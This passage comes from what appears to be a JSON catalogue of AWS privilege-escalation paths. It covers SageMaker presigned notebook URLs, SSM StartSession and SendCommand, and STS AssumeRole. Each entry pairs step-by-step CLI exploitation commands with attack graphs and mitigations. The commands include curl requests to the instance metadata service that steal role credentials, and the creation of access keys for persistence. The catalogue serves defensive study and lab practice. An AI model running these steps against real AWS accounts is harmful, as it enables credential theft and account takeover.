          "description": "If the target role has AdministratorAccess or equivalent administrative permissions, the attacker gains full control over the AWS account. The malicious script can create access keys for the attacker, modify IAM policies to grant persistent access, or directly access any AWS resource.\n"
        },
        {
          "from": "execute_script",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This might include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables), permissions to modify specific resources, or the ability to pursue additional privilege escalation techniques.\n"
        },
        {
          "from": "execute_script",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal or non-sensitive permissions, the privilege escalation may not yield meaningful additional access. However, the attacker could still use the processing job for reconnaissance or as part of a multi-step attack chain.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/sagemaker/sagemaker-003.yaml"
  },
  {
    "id": "sagemaker-004",
    "name": "sagemaker:CreatePresignedNotebookInstanceUrl",
    "category": "access-resource",
    "services": [
      "sagemaker"
    ],
    "description": "A principal with `sagemaker:CreatePresignedNotebookInstanceUrl` can generate a presigned URL to access an existing SageMaker notebook instance. If the notebook instance has a privileged execution role attached, the attacker can access the Jupyter environment and execute arbitrary code with the permissions of that role. This does not require creating a new notebook - only accessing an existing one.",
    "prerequisites": {
      "admin": [
        "A SageMaker notebook instance must exist with an administrative execution role",
        "The notebook instance must be in 'InService' status"
      ],
      "lateral": [
        "A SageMaker notebook instance must exist with a privileged execution role",
        "The notebook instance must be in 'InService' status"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws sagemaker list-notebook-instances",
          "description": "List available notebook instances to find targets with privileged roles"
        },
        {
          "step": 2,
          "command": "aws sagemaker describe-notebook-instance --notebook-instance-name TARGET_NOTEBOOK",
          "description": "Check the notebook's execution role ARN to confirm it has elevated permissions"
        },
        {
          "step": 3,
          "command": "aws sagemaker create-presigned-notebook-instance-url \\\n  --notebook-instance-name TARGET_NOTEBOOK\n",
          "description": "Generate a presigned URL to access the notebook"
        },
        {
          "step": 4,
          "command": "Open the presigned URL in a browser and use the Jupyter terminal to execute privileged commands",
          "description": "Access the notebook and execute commands with the privileged role's permissions"
        }
      ]
    },
    "recommendation": "Restrict the `sagemaker:CreatePresignedNotebookInstanceUrl` permission using resource-based constraints.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"sagemaker:CreatePresignedNotebookInstanceUrl\",\n  \"Resource\": \"arn:aws:sagemaker:REGION:ACCOUNT_ID:notebook-instance/SpecificNotebook\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"aws:PrincipalAccount\": \"ACCOUNT_ID\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `CreatePresignedNotebookInstanceUrl` events on sensitive notebooks\n- Use notebook lifecycle configurations to restrict capabilities\n- Implement VPC configuration to isolate notebook instances\n- Alert on presigned URL creation for notebooks with privileged roles\n- Regularly audit notebook instance execution roles and remove excessive permissions\n- Use SCPs to restrict notebook access patterns\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - SageMaker Presigned URL",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "sagemaker-001"
    ],
    "learningEnvironments": {
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "SageMakerCreatePresignedNotebookURL",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "sagemaker:CreatePresignedNotebookInstanceUrl",
          "resourceConstraints": "Must have permission to create presigned URLs for the target notebook instance"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `sagemaker:CreatePresignedNotebookInstanceUrl` permission. This principal can generate presigned URLs to access existing SageMaker notebook instances without creating new resources.\n"
        },
        {
          "id": "notebook_instance",
          "label": "Existing SageMaker Notebook Instance",
          "type": "resource",
          "description": "An existing SageMaker notebook instance in 'InService' status with a privileged execution role attached. The notebook provides a Jupyter environment where code can be executed. The execution role is used by the notebook to make AWS API calls, and any code executed in the notebook inherits these permissions.\n"
        },
        {
          "id": "execution_role",
          "label": "notebook-execution-role",
          "type": "resource",
          "description": "The IAM role attached to the notebook instance as its execution role. This role must trust sagemaker.amazonaws.com in its trust policy. When code is executed in the Jupyter notebook, it runs with the permissions of this execution role. The role's credentials are available through the AWS SDK or instance metadata service.\n"
        },
        {
          "id": "exfiltrate",
          "label": "Execute code in Jupyter",
          "type": "action",
          "color": "#99ccff",
          "description": "Once the attacker accesses the notebook via the presigned URL, they can use the Jupyter terminal or notebook cells to execute arbitrary code. The code runs with the execution role's permissions and can access AWS credentials through the AWS SDK. Common actions include creating access keys, modifying IAM policies, or accessing sensitive data in S3/RDS/DynamoDB.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the notebook's execution role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account by executing code in the Jupyter environment with those permissions.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the notebook's execution role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to sensitive data stores (S3, RDS, DynamoDB), ability to modify specific resources, or permissions that enable additional privilege escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the notebook's execution role only has minimal permissions (e.g., only CloudWatch Logs write access), the privilege escalation may not provide meaningful additional access to the attacker.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "notebook_instance",
          "label": "sagemaker:CreatePresignedNotebookInstanceUrl",
          "description": "The attacker generates a presigned URL to access an existing notebook instance. This does not require creating any new resources, only accessing an existing one.\n\nCommand:\n```bash\naws sagemaker create-presigned-notebook-instance-url \\\n  --notebook-instance-name TARGET_NOTEBOOK\n```\n\nThe command returns a presigned URL that provides authenticated access to the Jupyter notebook interface for a limited time (typically 12 hours by default).\n"
        },
        {
          "from": "notebook_instance",
          "to": "execution_role",
          "label": "Notebook uses execution role",
          "description": "The notebook instance is configured with an execution role that is automatically assumed when code runs in the Jupyter environment. The attacker doesn't need to explicitly assume the role - any code executed in the notebook automatically runs with the execution role's permissions through the notebook's IAM credentials.\n"
        },
        {
          "from": "execution_role",
          "to": "exfiltrate",
          "label": "Access Jupyter environment",
          "description": "The attacker opens the presigned URL in a browser to access the Jupyter notebook interface. They can then use the Jupyter terminal or create notebook cells to execute arbitrary Python or shell commands with the execution role's permissions.\n\nExample actions in Jupyter terminal:\n```bash\n# View the execution role credentials\naws sts get-caller-identity\n\n# Create access keys for starting principal\naws iam create-access-key --user-name STARTING_USER\n\n# Access sensitive data\naws s3 ls s3://sensitive-bucket\n```\n"
        },
        {
          "from": "exfiltrate",
          "to": "admin_outcome",
          "label": "If execution role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the notebook's execution role has AdministratorAccess or equivalent administrative permissions, the attacker gains full control over the AWS account. They can execute any AWS API call through the Jupyter environment or exfiltrate the execution role's credentials for later use.\n"
        },
        {
          "from": "exfiltrate",
          "to": "partial_outcome",
          "label": "If execution role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the notebook's execution role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. Common scenarios include access to sensitive data stores, ability to modify specific resources like Lambda functions or EC2 instances, or permissions that enable chaining to other privilege escalation techniques.\n"
        },
        {
          "from": "exfiltrate",
          "to": "minimal_outcome",
          "label": "If execution role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the notebook's execution role only has minimal permissions typically needed for notebook operation (such as CloudWatch Logs write access and basic SageMaker permissions), the privilege escalation may not yield meaningful additional access beyond what the starting principal already had.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/sagemaker/sagemaker-004.yaml"
  },
  {
    "id": "ssm-001",
    "name": "ssm:StartSession",
    "category": "access-resource",
    "services": [
      "ssm",
      "ec2"
    ],
    "description": "The `ssm:StartSession` permission allows a principal to remotely access any EC2 instance on which they have this permission. This access is contingent on the EC2 instance having the SSM agent installed and running, possessing the AmazonSSMManagedInstanceCore policy or equivalent permissions, and being in a running state. This permission provides SSH-like access via the AWS API. Consequently, the initiating principal may gain additional IAM permissions associated with the accessed instances. If an instance has a privileged IAM role attached, an attacker can abuse this permission to execute code that steals the credentials for that role, thereby escalating their own permissions.",
    "prerequisites": {
      "admin": [
        "EC2 instance must exist and be running",
        "EC2 instance must have SSM agent installed and running",
        "EC2 instance must have an instance profile attached to an IAM role",
        "IAM role must have AmazonSSMManagedInstanceCore policy or equivalent",
        "Target EC2 instance must have a role with administrative permissions attached"
      ],
      "lateral": [
        "EC2 instance must exist and be running",
        "EC2 instance must have SSM agent installed and running",
        "EC2 instance must have an instance profile attached to an IAM role",
        "IAM role must have AmazonSSMManagedInstanceCore policy or equivalent"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws ssm start-session --target i-XXXXXXXXXXX",
          "description": "Start an interactive SSM session on the target EC2 instance"
        },
        {
          "step": 2,
          "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "description": "Retrieve the role name from the instance metadata"
        },
        {
          "step": 3,
          "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME",
          "description": "Steal the temporary credentials for the instance's IAM role"
        }
      ]
    },
    "recommendation": "Restrict access to `ssm:StartSession` using the principle of least privilege. Use the\nResource and Condition elements in IAM policies to limit which instances a principal\ncan start sessions on. Monitor use of this sensitive permission using CloudSIEM detections.\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown"
    },
    "references": [
      {
        "title": "PMapper SSM Edges",
        "url": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/ssm_edges.py"
      },
      {
        "title": "IAM Vulnerable - SSM StartSession",
        "url": "https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc-ssmStartSession.tf"
      }
    ],
    "relatedPaths": [
      "ssm-002"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/ssm_edges.py#L103-L110"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/ssm-startsession",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "SSM-StartSession",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "ecs_efs_attack",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS attacks. This scenario uses ssm:StartSession to access EC2 instances after exploiting tag-based policies"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "ssm:StartSession",
          "resourceConstraints": "Target EC2 instance must be in the Resource section"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `ssm:StartSession` permission. This principal can start an interactive session on any EC2 instance that has the SSM agent installed and running, and that the principal has permission to access. The session provides shell access similar to SSH but operates entirely through the AWS API.\n"
        },
        {
          "id": "ec2_instance",
          "label": "EC2 Instance",
          "type": "resource",
          "description": "The target EC2 instance with SSM agent installed and running. The instance must have an IAM role attached via instance profile with the AmazonSSMManagedInstanceCore policy (or equivalent permissions) to enable Systems Manager functionality. The instance must also be in a running state for the session to be established.\n"
        },
        {
          "id": "instance_role",
          "label": "Existing Service Role",
          "type": "resource",
          "description": "The IAM role attached to the EC2 instance via instance profile. This role's temporary credentials are available through the Instance Metadata Service (IMDS) at http://169.254.169.254/latest/meta-data/iam/security-credentials/. Once the attacker gains session access to the instance, they can retrieve these credentials and use them from any location.\n"
        },
        {
          "id": "exfiltrate_creds",
          "label": "Exfiltrate credentials via IMDS",
          "type": "action",
          "color": "#99ccff",
          "description": "Once the SSM session is established, the attacker can access the Instance Metadata Service (IMDS) to retrieve the temporary security credentials for the instance role. These credentials include AccessKeyId, SecretAccessKey, and SessionToken, which can be exported to environment variables and used with the AWS CLI or SDK from any location.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the instance role has AdministratorAccess or equivalent administrative permissions, the attacker gains full administrative access to the AWS account using the exfiltrated credentials. They can perform any action in the account including creating new admin users, modifying resources, or accessing sensitive data.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the instance role has some elevated permissions but not full admin access, the attacker gains partial privilege escalation. This could include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables), ability to modify certain resources, or permissions that enable additional privilege escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the instance role only has minimal permissions (such as the basic AmazonSSMManagedInstanceCore policy for Systems Manager functionality), the credential exfiltration may not provide meaningful additional access beyond what the starting principal already had. However, even limited access could be useful for reconnaissance.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "ec2_instance",
          "label": "ssm:StartSession",
          "description": "Start an interactive Systems Manager session on the target EC2 instance using ssm:StartSession. This establishes a shell session similar to SSH but operates entirely through the AWS API without requiring network connectivity to the instance or open SSH ports.\n\nCommand:\n```bash\naws ssm start-session --target i-XXXXXXXXXXX\n```\n\nAfter executing this command, an interactive shell session is established on the instance.\n"
        },
        {
          "from": "ec2_instance",
          "to": "instance_role",
          "label": "Session access to instance",
          "description": "The SSM session provides shell access to the EC2 instance. The instance automatically provides access to the attached IAM role's credentials through the Instance Metadata Service. Unlike SSH-based access, SSM sessions operate through the AWS API and don't require open network ports.\n"
        },
        {
          "from": "instance_role",
          "to": "exfiltrate_creds",
          "label": "Access IMDS for credentials",
          "description": "From the SSM session on the EC2 instance, query the Instance Metadata Service (IMDS) to retrieve the temporary security credentials for the instance role. First retrieve the role name, then fetch the credentials using that name.\n\nCommands:\n```bash\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME\n```\n\nThe response contains JSON with the temporary credentials (AccessKeyId, SecretAccessKey, SessionToken) that can be used from any location.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "admin_outcome",
          "label": "If instance role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the instance role has AdministratorAccess or equivalent administrative permissions, the attacker can use the exfiltrated credentials to gain full control over the AWS account. They can create new admin users, access all resources, modify security configurations, and perform any privileged action.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "partial_outcome",
          "label": "If instance role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the instance role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. Common scenarios include access to S3 buckets, RDS databases, DynamoDB tables, or permissions to modify specific resources. The attacker should enumerate the role's permissions to identify data access or additional escalation paths.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "minimal_outcome",
          "label": "If instance role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the instance role only has minimal permissions such as the AmazonSSMManagedInstanceCore policy (required for SSM functionality) or basic CloudWatch logs write access, the exfiltrated credentials may not provide significant additional access. However, even limited permissions could reveal information about the environment or be useful as part of a multi-step attack chain.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ssm/ssm-001.yaml"
  },
  {
    "id": "ssm-002",
    "name": "ssm:SendCommand",
    "category": "access-resource",
    "services": [
      "ssm",
      "ec2"
    ],
    "description": "The `ssm:SendCommand` permission allows a principal to execute commands on any EC2 instance on which they have this permission, using SSM Run Command. This access is contingent on the EC2 instance having the SSM agent installed, possessing the AmazonSSMManagedInstanceCore policy (or equivalent permissions), and being in a running state. If an instance has a privileged IAM role attached, an attacker can abuse this permission to execute code that steals the credentials for that role, thereby escalating their own permissions.",
    "prerequisites": {
      "admin": [
        "EC2 instance must exist and be running",
        "EC2 instance must have SSM agent installed",
        "EC2 instance must have an instance profile attached to an IAM role",
        "IAM role must have AmazonSSMManagedInstanceCore policy or equivalent",
        "Target EC2 instance must have a role with administrative permissions attached"
      ],
      "lateral": [
        "EC2 instance must exist and be running",
        "EC2 instance must have SSM agent installed",
        "EC2 instance must have an instance profile attached to an IAM role",
        "IAM role must have AmazonSSMManagedInstanceCore policy or equivalent"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws ssm send-command --instance-ids \"i-XXXXXXXXXXX\" --document-name \"AWS-RunShellScript\" --comment \"Stealing IAM credentials\" --parameters commands=[\"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME\"]",
          "description": "Send a command to steal the IAM role credentials from instance metadata"
        },
        {
          "step": 2,
          "command": "aws ssm get-command-invocation --command-id @command-id --instance-id i-XXXXXXXXXXX",
          "description": "Retrieve the command output containing the temporary credentials"
        }
      ]
    },
    "recommendation": "Restrict access to `ssm:SendCommand` using the principle of least privilege. Use the\nResource and Condition elements in IAM policies to limit which instances a principal\ncan run commands on and which documents they can use. Monitor use of this sensitive\npermission using CloudSIEM detections.\n",
    "discoveredBy": {
      "name": "Unknown",
      "organization": "Unknown"
    },
    "references": [
      {
        "title": "IAM Vulnerable - SSM SendCommand",
        "url": "https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc-ssmSendCommand.tf"
      }
    ],
    "relatedPaths": [
      "ssm-001"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/ssm-sendcommand",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "SSM-SendCommand",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/ssm_edges.py#L85-L95"
    },
    "permissions": {
      "required": [
        {
          "permission": "ssm:SendCommand",
          "resourceConstraints": "Target EC2 instance must be in the Resource section"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `ssm:SendCommand` permission. This principal can execute arbitrary commands on any EC2 instance where they have this permission, as long as the instance has the SSM agent installed, is running, and has the AmazonSSMManagedInstanceCore policy (or equivalent). The command output is captured and can be retrieved via SSM.\n"
        },
        {
          "id": "ec2_instance",
          "label": "Existing EC2 Instance",
          "type": "resource",
          "description": "The target EC2 instance with SSM agent installed and running. The instance must have an instance profile attached with an IAM role that has the AmazonSSMManagedInstanceCore policy (or equivalent SSM permissions). The instance must be in a running state for SSM commands to execute successfully.\n"
        },
        {
          "id": "instance_role",
          "label": "Existing Service Role",
          "type": "resource",
          "description": "The IAM role attached to the EC2 instance via instance profile. This role's temporary credentials are available through the Instance Metadata Service (IMDS) at http://169.254.169.254/latest/meta-data/iam/security-credentials/. The attacker can execute a command via SSM to retrieve these credentials and the output is captured by SSM for later retrieval.\n"
        },
        {
          "id": "exfiltrate_creds",
          "label": "Exfiltrate credentials via IMDS",
          "type": "action",
          "color": "#99ccff",
          "description": "Using SSM SendCommand, the attacker executes a shell command on the EC2 instance to query the Instance Metadata Service (IMDS) for the instance role's temporary credentials. The command output containing the credentials (AccessKeyId, SecretAccessKey, and SessionToken) is captured by SSM and can be retrieved using get-command-invocation. These credentials can then be used from any location.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the instance role has AdministratorAccess or equivalent administrative permissions, the attacker gains full administrative access to the AWS account using the exfiltrated credentials. They can perform any action in the account including creating new admin users, modifying resources, accessing sensitive data, or establishing persistence.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the instance role has some elevated permissions but not full admin access, the attacker gains partial privilege escalation. This could include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables), ability to modify certain resources, or permissions that enable additional privilege escalation paths. The attacker should enumerate the role's permissions using sts:GetCallerIdentity and iam:GetRolePolicy to identify available actions.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the instance role only has minimal permissions (such as AmazonSSMManagedInstanceCore for SSM functionality, CloudWatch logs write access, or basic EC2 describe permissions), the credential exfiltration may not provide meaningful additional access beyond what the starting principal already had. However, even limited access could be useful for reconnaissance or as part of a multi-step attack.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "ec2_instance",
          "label": "ssm:SendCommand",
          "description": "Use ssm:SendCommand to execute a shell command on the target EC2 instance that retrieves the IAM role credentials from the Instance Metadata Service (IMDS). The command uses the AWS-RunShellScript document to execute arbitrary commands, and SSM captures the output for later retrieval.\n\nCommand:\n```bash\naws ssm send-command \\\n  --instance-ids \"i-XXXXXXXXXXX\" \\\n  --document-name \"AWS-RunShellScript\" \\\n  --comment \"Stealing IAM credentials\" \\\n  --parameters commands=[\"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME\"]\n```\n\nThe command returns a CommandId that is used to retrieve the output in the next step.\n"
        },
        {
          "from": "ec2_instance",
          "to": "instance_role",
          "label": "Command executes on instance",
          "description": "The SSM agent on the EC2 instance receives and executes the command. Since the command runs in the context of the instance, it has automatic access to the Instance Metadata Service (IMDS) where the instance role's temporary credentials are available. The command output is captured by SSM.\n"
        },
        {
          "from": "instance_role",
          "to": "exfiltrate_creds",
          "label": "Retrieve command output with credentials",
          "description": "Use ssm:GetCommandInvocation to retrieve the output of the previously executed command. The output contains the JSON response from IMDS with the instance role's temporary security credentials including AccessKeyId, SecretAccessKey, and SessionToken.\n\nCommand:\n```bash\naws ssm get-command-invocation \\\n  --command-id @command-id \\\n  --instance-id i-XXXXXXXXXXX\n```\n\nThe credentials can then be exported to environment variables and used with AWS CLI or SDK from any location.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "admin_outcome",
          "label": "If instance role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the instance role has AdministratorAccess or equivalent administrative permissions, the attacker can use the exfiltrated credentials to gain full control over the AWS account. They can create new admin users, access all resources, modify security configurations, delete resources, and perform any privileged action. This represents complete account compromise.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "partial_outcome",
          "label": "If instance role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the instance role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. Common scenarios include access to S3 buckets with sensitive data, RDS database credentials via Secrets Manager, DynamoDB tables, or permissions to modify specific resources. The attacker should enumerate the role's permissions and identify data access opportunities or additional privilege escalation paths.\n"
        },
        {
          "from": "exfiltrate_creds",
          "to": "minimal_outcome",
          "label": "If instance role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the instance role only has minimal permissions such as AmazonSSMManagedInstanceCore (required for SSM functionality), CloudWatch logs write access, or basic EC2 describe permissions, the exfiltrated credentials may not provide significant additional access beyond what the starting principal already had. However, even limited permissions could reveal information about the environment useful for reconnaissance or be combined with other techniques in a multi-step attack.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/ssm/ssm-002.yaml"
  },
  {
    "id": "sts-001",
    "name": "sts:AssumeRole",
    "category": "lateral-movement",
    "services": [
      "sts"
    ],
    "description": "A principal with `sts:AssumeRole` permission can assume IAM roles that trust them in their trust policy. If a role with elevated permissions has a trust policy that allows the attacker's principal to assume it, they can gain those elevated permissions by assuming the role. This is one of the most straightforward privilege escalation paths when misconfigured trust relationships exist.",
    "prerequisites": {
      "admin": [
        "A role must exist with administrative permissions (e.g., AdministratorAccess)",
        "The role's trust policy must allow the attacker's principal (user/role) to assume it"
      ],
      "lateral": [
        "A role must exist with elevated permissions",
        "The role's trust policy must allow the attacker's principal (user/role) to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws sts get-caller-identity",
          "description": "Verify current identity before privilege escalation"
        },
        {
          "step": 2,
          "command": "aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table",
          "description": "List available roles to find targets with elevated permissions (optional but helpful for discovery)"
        },
        {
          "step": 3,
          "command": "aws iam get-role --role-name TARGET_ROLE",
          "description": "Check the role's trust policy to confirm the attacker can assume it, and view attached policies (optional)"
        },
        {
          "step": 4,
          "command": "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \\\n  --role-session-name privesc-session\n",
          "description": "Assume the privileged role to obtain temporary credentials with elevated permissions"
        },
        {
          "step": 5,
          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 4>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 4>\nexport AWS_SESSION_TOKEN=<SessionToken from step 4>\n",
          "description": "Configure the AWS CLI to use the assumed role credentials"
        },
        {
          "step": 6,
          "command": "aws sts get-caller-identity",
          "description": "Verify the assumed role identity"
        },
        {
          "step": 7,
          "command": "aws iam list-users --max-items 3",
          "description": "Verify administrative access was successfully obtained"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "run iam__enum_permissions",
          "description": "Enumerate IAM permissions and identify assumable roles"
        },
        {
          "step": 2,
          "command": "run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE",
          "description": "Assume the privileged role using Pacu"
        }
      ]
    },
    "recommendation": "Carefully audit IAM role trust policies to ensure they follow the principle of least privilege.\nOnly allow trusted principals to assume sensitive roles.\n\nExample restrictive trust policy:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificTrustedRole\"\n      },\n      \"Action\": \"sts:AssumeRole\",\n      \"Condition\": {\n        \"StringEquals\": {\n          \"sts:ExternalId\": \"unique-external-id\"\n        },\n        \"IpAddress\": {\n          \"aws:SourceIp\": \"203.0.113.0/24\"\n        }\n      }\n    }\n  ]\n}\n```\n\nAdditional controls:\n- **Require MFA**: Require MFA for sensitive role assumptions using `aws:MultiFactorAuthPresent` condition\n- **Use External IDs**: Use external IDs for cross-account role assumptions to prevent confused deputy attacks\n- **IP Address Restrictions**: Implement IP address restrictions in trust policies using `aws:SourceIp` condition\n- **Session Policies**: Implement session policies to limit permissions even when assuming privileged roles, providing an additional layer of defense\n- **Monitor CloudTrail**: Alert on `AssumeRole` events on privileged roles, especially from unexpected principals\n- **IAM Access Analyzer**: Regularly audit role trust policies with AWS IAM Access Analyzer to identify overly permissive trust relationships\n- **Alert on Patterns**: Alert on unusual assume-role patterns or assumptions from unexpected IP addresses\n- **Service Control Policies**: Use SCPs to restrict which roles can be assumed at the organizational level\n- **AWS Config Rules**: Use AWS Config rules to detect roles with administrative permissions that can be assumed by users or have overly permissive trust policies\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - AssumeRole",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "iam-002",
      "iam-003",
      "iam-004"
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/sts-assumerole",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "STS-AssumeRole",
